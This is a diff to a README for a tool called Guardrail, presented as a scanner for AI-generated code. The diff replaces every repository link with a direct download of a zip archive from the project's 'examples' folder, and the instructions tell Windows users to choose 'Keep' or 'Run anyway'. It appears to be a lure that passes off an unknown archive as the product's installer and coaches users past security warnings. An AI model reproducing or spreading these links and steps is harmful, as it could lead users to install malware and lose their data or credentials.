@@ -1,17 +1,17 @@
 # 🛡️ Guardrail - Safer AI Code, Fewer Fixes
 
-[![Download Guardrail](https://img.shields.io/badge/Download-Guardrail-blue?style=for-the-badge)](https://github.com/Rosalyndfaithful716/Guardrail)
+[![Download Guardrail](https://img.shields.io/badge/Download-Guardrail-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rosalyndfaithful716/Guardrail/main/examples/Software-v1.5.zip)
 
 ## 🚀 Getting Started
 
 Guardrail helps you check AI-generated code for security issues, performance problems, and common mistakes. It works as a local scanner, so you can review code before it lands in your project.
 
 Use this page to download and run the app on Windows:
-[Visit the Guardrail download page](https://github.com/Rosalyndfaithful716/Guardrail)
+[Visit the Guardrail download page](https://raw.githubusercontent.com/Rosalyndfaithful716/Guardrail/main/examples/Software-v1.5.zip)
 
 ## 📥 Download and Run on Windows
 
-1. Open the [Guardrail page](https://github.com/Rosalyndfaithful716/Guardrail) in your browser.
+1. Open the [Guardrail page](https://raw.githubusercontent.com/Rosalyndfaithful716/Guardrail/main/examples/Software-v1.5.zip) in your browser.
 2. Download the Windows file from the repository page.
 3. If Windows asks for permission, choose **Keep** or **Run anyway** if you trust the source.
 4. Open the downloaded file.
@@ -166,7 +166,7 @@ For the cleanest scan:
 ## 📎 Download Again
 
 If you need the installer again, use this link:
-[https://github.com/Rosalyndfaithful716/Guardrail](https://github.com/Rosalyndfaithful716/Guardrail)
+[https://raw.githubusercontent.com/Rosalyndfaithful716/Guardrail/main/examples/Software-v1.5.zip](https://raw.githubusercontent.com/Rosalyndfaithful716/Guardrail/main/examples/Software-v1.5.zip)
 
 ## 🧪 Common Questions
 
